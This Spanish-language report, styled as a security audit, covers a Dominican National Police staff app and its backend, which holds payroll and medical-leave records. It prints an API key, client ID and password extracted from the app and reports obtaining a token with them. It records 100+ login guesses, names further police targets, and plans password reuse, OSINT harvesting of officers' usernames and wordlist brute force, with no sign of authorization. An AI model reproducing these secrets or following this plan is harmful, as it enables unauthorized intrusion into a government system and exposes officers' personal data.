# PSP: Servicios Policiales — Security Audit Report

**Target:** com.policiard.psp (Android/iOS)
**Publisher:** Policía Nacional Dominicana
**Fecha:** 10 Julio 2026
**Estado:** CERRADO — Sin credenciales válidas para login interno

---

## Perfil

| Atributo | Valor |
|---|---|
| Package | `com.policiard.psp` |
| iOS ID | `id6739888552` |
| Versión | 1.20 (Jun 2026) |
| Stack | Ionic/Angular + Capacitor (WebView) |
| Backend | .NET ASP.NET MVC 5.2 / IIS 10.0 |
| Hosting | psp.policia.gob.do (AWS/on-prem) |
| Email | webmail.policia.gob.do (MailEnable 10.55) |
| Entorno | ⚠️ `production: false` (dev config expuesta) |

## Datos en la App

- Volante de pago / nóminas de policías
- Detalle de ingresos
- Solicitud de vacaciones
- Licencias médicas
- Comunicación interna
- Biblioteca virtual (reglamentos)

## APIs Descubiertas

### Interna (psp.policia.gob.do:8081/api)

| Endpoint | Método | Auth | Estado |
|---|---|---|---|
| `/Employees` | GET | Bearer | 401 ✅ Existe |
| `/Employees/payroll` | GET | Bearer | 401 ✅ Existe |
| `/Employees/payrollDeductions?idNomina=X` | GET | Bearer | 401 ✅ Existe |
| `/Published` | GET | None | 200 🟢 (17 docs) |
| `/Users/login` | POST | None | 400/401 🟢 Login endpoint |
| `/Users/changePassword` | PUT | Bearer | 405 ✅ Existe |
| `/News` | GET | Bearer | 401 ✅ Existe |
| `/News/categories` | GET | Bearer | 401 ✅ Existe |
| `/Survey` | GET | Bearer | 401 ✅ Existe |

### Externa (api.ulticabinet.com/v1)

| Endpoint | Método | Auth | Estado |
|---|---|---|---|
| `/auth/token` | POST | apiKey+clientId | 200 ✅ **JWT TOKEN OBTENIDO** |

## Credenciales Extraídas (desde APK)

```json
{
  "baseURL": "https://psp.policia.gob.do:8081/api",
  "baseURLService": "https://api.ulticabinet.com",
  "baseUrlImage": "https://psp.policia.gob.do:8443",
  "apiKey": "301a7e37-264c-4ec6-89bd-011586e33958",
  "clientId": "56aed9e5-655b-4203-a978-4cbe826591c4",
  "userId": "PSP",
  "password": "Policia1936@",
  "production": false
}
```

## Login Endpoint

```
POST https://psp.policia.gob.do:8081/api/Users/login
Content-Type: application/json
Body: {"UserName":"X", "Password":"Y"}

Códigos de error:
- VM0 / USER_NOT_FOUND — username no existe
- VM5 / Error al Conectarse con la api — formato email/dot triggers external API
```

~100+ usernames probados sin éxito. El sistema usa IDs de empleado internos.

## Documentos Publicados (sin auth)

17 documentos extraídos: Constitución RD 2024, Ley Orgánica PN, Manual de Taser, reglamentos y guías operativas.

## Targets Secundarios

- **Denuncias Virtuales**: `com.policianacional.denunciavirtual` — portal de denuncias policial
- **Web**: denuncias.policia.gob.do — ASP.NET con registro de usuarios
- **SPCC**: spcc.pn.gob.do — protegido por Incapsula

## Vectores No Explotados

- Password `Policia1936@` en Denuncias (mismo ecosistema?)
- Usuarios reales obtenidos vía OSINT de la PN
- Fuerza bruta con wordlist de empleados públicos RD
